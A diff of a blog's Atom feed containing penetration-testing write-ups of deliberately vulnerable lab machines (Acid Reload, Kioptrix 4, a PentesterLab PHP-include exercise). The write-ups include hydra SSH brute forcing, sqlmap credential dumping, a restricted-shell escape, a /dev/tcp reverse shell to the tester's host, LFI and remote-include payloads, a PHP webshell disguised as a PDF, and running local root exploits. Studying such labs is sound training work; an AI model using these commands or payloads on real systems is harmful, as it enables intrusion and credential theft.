+</span><span class='line'>  <span class="nt">&lt;c:ContactIDCollection&gt;&lt;c:ContactID</span> <span class="na">c:ElementID=</span><span class="s">&quot;599ef753-f77f-4224-8700-e551bdc2bb1e&quot;</span><span class="nt">&gt;&lt;c:Value&gt;</span>0bcf610e-a7be-4f26-9042-d6b3c22c9863<span class="nt">&lt;/c:Value&gt;&lt;/c:ContactID&gt;&lt;/c:ContactIDCollection&gt;&lt;c:EmailAddressCollection&gt;&lt;c:EmailAddress</span> <span class="na">c:ElementID=</span><span class="s">&quot;0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e&quot;</span><span class="nt">&gt;&lt;c:Type&gt;</span>SMTP<span class="nt">&lt;/c:Type&gt;&lt;c:Address&gt;</span>acid.exploit@gmail.com<span class="nt">&lt;/c:Address&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>Preferred<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:EmailAddress&gt;&lt;c:EmailAddress</span> <span class="na">c:ElementID=</span><span class="s">&quot;594eec25-47bd-4290-bd96-a17448f7596a&quot;</span> <span class="na">xsi:nil=</span><span class="s">&quot;true&quot;</span><span class="nt">/&gt;&lt;/c:EmailAddressCollection&gt;&lt;c:NameCollection&gt;&lt;c:Name</span> <span class="na">c:ElementID=</span><span class="s">&quot;318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2&quot;</span><span class="nt">&gt;&lt;c:FormattedName&gt;</span>Avinash<span class="nt">&lt;/c:FormattedName&gt;&lt;c:GivenName&gt;</span>Avinash<span class="nt">&lt;/c:GivenName&gt;&lt;/c:Name&gt;&lt;/c:NameCollection&gt;&lt;c:PersonCollection&gt;&lt;c:Person</span> <span class="na">c:ElementID=</span><span class="s">&quot;865f9eda-796e-451a-92b1-bf8ee2172134&quot;</span><span class="nt">&gt;&lt;c:FormattedName&gt;</span>Makke<span class="nt">&lt;/c:FormattedName&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>wab:Spouse<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:Person&gt;&lt;/c:PersonCollection&gt;&lt;c:PhotoCollection&gt;&lt;c:Photo</span> <span class="na">c:ElementID=</span><span class="s">&quot;2fb5b981-cec1-45d0-ae61-7c340cfb3d72&quot;</span><span class="nt">&gt;&lt;c:LabelCollection&gt;&lt;c:Label&gt;</span>UserTile<span class="nt">&lt;/c:Label&gt;&lt;/c:LabelCollection&gt;&lt;/c:Photo&gt;&lt;/c:PhotoCollection&gt;&lt;/c:contact&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>find a base64 encoded <code>AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</code>, its NooB@123</p>
+
+<p>create a dict file</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='xml'><span class='line'>Avinash
+</span><span class='line'>avinash
+</span><span class='line'>Makke
+</span><span class='line'>makke
+</span><span class='line'>acid
+</span><span class='line'>acid.exploit
+</span><span class='line'>acid.exploit@gmail.com
+</span><span class='line'>NooB@123
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>use hydra to crack</p>
+
+<p><code>hydra -L dict.txt -P dict.txt  192.168.41.171 ssh -s 22</code></p>
+
+<p>get login: makke   password: NooB@123</p>
+
+<p>find <code>.bash_history</code> file</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting file <code>overlayfs</code></p>
+
+<p><code>locate overlayfs</code></p>
+
+<p>in <code>/bin</code></p>
+
+<p><code>ls -alh overlayfs</code></p>
+
+<p><code>-rwxr-xr-x 1 root root 12K Aug 24  2015 overlayfs</code></p>
+
+<p>which is overlayfs local root exploit file</p>
+
+<p>run it
+get the root</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Acid Server]]></title>
@@ -4253,476 +4843,6 @@
 
 
 <p><img src="http://wg135.github.io/images/blog/misc/metasploitable2/Selection_039.png" title="[title manually exploit [alt text]]" ></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Vulhub Kioptrix Level 4]]></title>
-    <link href="http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4/"/>
-    <updated>2016-06-15T16:10:59-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4</id>
-    <content type="html"><![CDATA[<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>wfuzz</li>
-<li>nikto</li>
-<li>zap</li>
-<li>Burpsuite</li>
-<li>Sqlmap</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.190 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.190 -p-</code></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># nmap -sV -v -O -A -T5 192.168.79.190 -p-
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-15 16:14 CDT
-</span><span class='line'>NSE: Loaded 138 scripts for scanning.
-</span><span class='line'>NSE: Script Pre-scanning.
-</span><span class='line'>Initiating NSE at 16:14
-</span><span class='line'>Completed NSE at 16:14, 0.00s elapsed
-</span><span class='line'>Initiating NSE at 16:14
-</span><span class='line'>Completed NSE at 16:14, 0.00s elapsed
-</span><span class='line'>Initiating ARP Ping Scan at 16:14
-</span><span class='line'>Scanning 192.168.79.190 [1 port]
-</span><span class='line'>Completed ARP Ping Scan at 16:14, 0.00s elapsed (1 total hosts)
-</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 16:14
-</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 16:14, 1.99s elapsed
-</span><span class='line'>Initiating SYN Stealth Scan at 16:14
-</span><span class='line'>Scanning 192.168.79.190 [65535 ports]
-</span><span class='line'>Discovered open port 445/tcp on 192.168.79.190
-</span><span class='line'>Discovered open port 139/tcp on 192.168.79.190
-</span><span class='line'>Discovered open port 80/tcp on 192.168.79.190
-</span><span class='line'>Discovered open port 22/tcp on 192.168.79.190
-</span><span class='line'>Completed SYN Stealth Scan at 16:14, 11.91s elapsed (65535 total ports)
-</span><span class='line'>Initiating Service scan at 16:14
-</span><span class='line'>Scanning 4 services on 192.168.79.190
-</span><span class='line'>Completed Service scan at 16:14, 11.02s elapsed (4 services on 1 host)
-</span><span class='line'>Initiating OS detection (try #1) against 192.168.79.190
-</span><span class='line'>NSE: Script scanning 192.168.79.190.
-</span><span class='line'>Initiating NSE at 16:14
-</span><span class='line'>Completed NSE at 16:15, 15.56s elapsed
-</span><span class='line'>Initiating NSE at 16:15
-</span><span class='line'>Completed NSE at 16:15, 0.01s elapsed
-</span><span class='line'>Nmap scan report for 192.168.79.190
-</span><span class='line'>Host is up (0.00033s latency).
-</span><span class='line'>Not shown: 39528 closed ports, 26003 filtered ports
-</span><span class='line'>PORT    STATE SERVICE     VERSION
-</span><span class='line'>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
-</span><span class='line'>| ssh-hostkey: 
-</span><span class='line'>|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
-</span><span class='line'>|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
-</span><span class='line'>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
-</span><span class='line'>| http-methods: 
-</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
-</span><span class='line'>|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
-</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
-</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>MAC Address: 00:0C:29:EA:4D:22 (VMware)
-</span><span class='line'>Device type: general purpose
-</span><span class='line'>Running: Linux 2.6.X
-</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
-</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
-</span><span class='line'>Uptime guess: 0.001 days (since Wed Jun 15 16:13:14 2016)
-</span><span class='line'>Network Distance: 1 hop
-</span><span class='line'>TCP Sequence Prediction: Difficulty=203 (Good luck!)
-</span><span class='line'>IP ID Sequence Generation: All zeros
-</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span><span class='line'>
-</span><span class='line'>Host script results:
-</span><span class='line'>| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
-</span><span class='line'>| Names:
-</span><span class='line'>|   KIOPTRIX4&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;
-</span><span class='line'>|   KIOPTRIX4&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;
-</span><span class='line'>|   KIOPTRIX4&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;
-</span><span class='line'>|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
-</span><span class='line'>|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
-</span><span class='line'>|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
-</span><span class='line'>|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
-</span><span class='line'>| smb-os-discovery: 
-</span><span class='line'>|   OS: Unix (Samba 3.0.28a)
-</span><span class='line'>|   Computer name: Kioptrix4
-</span><span class='line'>|   NetBIOS computer name: 
-</span><span class='line'>|   Domain name: localdomain
-</span><span class='line'>|   FQDN: Kioptrix4.localdomain
-</span><span class='line'>|_  System time: 2016-06-15T17:15:00-04:00
-</span><span class='line'>| smb-security-mode: 
-</span><span class='line'>|   account_used: guest
-</span><span class='line'>|   authentication_level: user
-</span><span class='line'>|   challenge_response: supported
-</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
-</span><span class='line'>|_smbv2-enabled: Server doesn't support SMBv2 protocol
-</span><span class='line'>
-</span><span class='line'>TRACEROUTE
-</span><span class='line'>HOP RTT     ADDRESS
-</span><span class='line'>1   0.33 ms 192.168.79.190
-</span><span class='line'>
-</span><span class='line'>NSE: Script Post-scanning.
-</span><span class='line'>Initiating NSE at 16:15
-</span><span class='line'>Completed NSE at 16:15, 0.00s elapsed
-</span><span class='line'>Initiating NSE at 16:15
-</span><span class='line'>Completed NSE at 16:15, 0.00s elapsed
-</span><span class='line'>Read data files from: /usr/bin/../share/nmap
-</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
-</span><span class='line'>           Raw packets sent: 91558 (4.029MB) | Rcvd: 39548 (1.583MB)
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Services ssh, http and smb are running.</p>
-
-<h3>check HTTP service:</h3>
-
-<p>use wfuzz to scan:</p>
-
-<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.190/FUZZ 2&gt;/dev/null</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>use nikto to scan:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<h3>check SMB service:</h3>
-
-<p>use enum4linux to enumerate SMB:</p>
-
-<p><code>enum4linux -a 192.168.79.190</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>I searched exploitdb and metasploit and tried serveral exploits to SMB, failed.</p>
-
-<p>Now I turn to http service.</p>
-
-<p>use zap to scan:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like there is a SQL injection in parameter mypassword.</p>
-
-<p>use Burp to check:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>save the POST request to a file called test.txt</p>
-
-<p>run sqlmap to dump the credential:</p>
-
-<p><code>sqlmap -r test.txt -p mypassword --dump</code></p>
-
-<p>get:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now try to login to web and see if I can upload webshell:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Nothing excited.</p>
-
-<p>Okay, try to login via SSH:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>It is an limited shell:</p>
-
-<p>&lsquo;ls -ahlR /root/&rsquo;</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>After google it, I found it may be lshell</p>
-
-<p><a href="https://github.com/ghantoos/lshell">lshell</a></p>
-
-<p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p>
-
-<p>looks like it support command echo, try to get bash:</p>
-
-<p><code>echo os.system("/bin/bash")</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Got the shell now!</p>
-
-<p>start to get root&hellip;</p>
-
-<p>Enumeration stage,</p>
-
-<p><code>uname -a</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><code>searchsploit linux kernel 2.6 | grep local</code> and I pick sendpage one</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>download the exploit to /var/www/html/:</p>
-
-<p><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9641.tar.gz</code></p>
-
-<p>start web server:</p>
-
-<p><code>service apache2 start</code></p>
-
-<p>in kioptrix4</p>
-
-<p><code>wget http://192.168.79.173/9641.tar.gz</code></p>
-
-<p>hang there, maybe iptable block the traffic to port 80</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>I tried <code>/bin/bash -i &gt; /dev/tcp/192.168.79.173/1234 0&lt;&amp;1</code> also doesn&rsquo;t work</p>
-
-<p>finally I used python SimpleHTTPServer:</p>
-
-<p><code>service apache2 stop</code>
-<code>python -m SimpleHTTPServer</code></p>
-
-<p>in kioptrix4</p>
-
-<p><code>wget 192.168.79.173:8000/9641.tar.gz</code></p>
-
-<p>unzip it:</p>
-
-<p><code>tar zxvf 9641.tar.gz</code></p>
-
-<p>try to compile it, cannot find gcc. WTF</p>
-
-<p>search it</p>
-
-<p><code>whereis gcc</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>this is a folder, and it is i486-linux-gnu, check kioptrix4&rsquo;s architecture.</p>
-
-<p><code>uname -m</code>
-It is i686. Oh different&hellip;.</p>
-
-<p>Luckly, my kali is i686, I just compile on my kali and upload to kioptrix4</p>
-
-<p>run it</p>
-
-<p>get the root:</p>
-
-<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix4/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[pentesterlab-PHP-include]]></title>
-    <link href="http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include/"/>
-    <updated>2016-06-14T12:52:00-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/06/14/pentesterlab-php-include</id>
-    <content type="html"><![CDATA[<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>Nikto</li>
-<li>Wfuzz</li>
-<li>Netcat</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.188 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Only port 80 is opening.</p>
-
-<p>Use Wfuzz to scan</p>
-
-<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.188/FUZZ 2&gt;/dev/null</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>use nikto to scan</p>
-
-<p><code>nikto -h 192.168.79.188</code></p>
-
-<p>looks like there is a php include vulnerability</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Lets confirm it:</p>
-
-<p><code>http://192.168.79.188/index.php?page=fgfgfgf</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p><code>http://192.168.79.188/index.php?page=../../../../../../../../../../etc/passwd%00</code></p>
-
-<p>(the reason why add %00 after /etc/passwd is php code will ad a suffix .php, so that we have to add a Null byte to get rid of it)</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>I tried to exploit remote file inclide:</p>
-
-<p><code>http://192.168.79.188/index.php?page=http://192.168.79.173/webshell.txt&amp;cmd=ifconfig</code></p>
-
-<p>Doesn&rsquo;t work.</p>
-
-<p>Exam the webpage, I find that I can upload pdf file to the server. I tried just rename webshell.txt to webshell.pdf and the server doesn&rsquo;t accpet it. I guess the server will valid the pdf file format. So I create a craft pdf file:</p>
-
-<figure class='code'><figcaption><span>webshell.pdf</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">%</span><span class="nx">PDF</span><span class="o">-</span><span class="mf">1.4</span>
-</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Upload it. Works.</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Now try to visit after log in.</p>
-
-<p>Try to verify the webshell:</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>looks good</p>
-
-<p>set up netcat listener on my kali and run the command on server:</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>and get the shell:</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
 ]]></content>
   </entry>
   
